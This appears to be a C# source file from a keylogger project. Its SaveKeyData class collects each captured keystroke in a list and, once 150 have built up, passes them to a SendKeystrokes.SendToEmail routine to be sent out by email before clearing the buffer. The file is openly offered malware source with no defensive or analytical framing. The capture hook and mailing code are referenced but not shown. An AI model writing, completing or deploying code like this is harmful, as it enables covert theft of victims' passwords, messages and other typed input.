using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger.Keylogger
{
    public class SaveKeyData
    {
        public static List<string> keyValues = new List<string>();

        public static void SaveKey(Keys key)
        {
            if(keyValues.Count >= 150)
            {
                SendKeystrokes.SendToEmail(string.Join(", ", keyValues));
                keyValues.Clear();

                keyValues.Add(key.ToString());
            }
            else
            {
                keyValues.Add(key.ToString());
            }
        }
    }
}
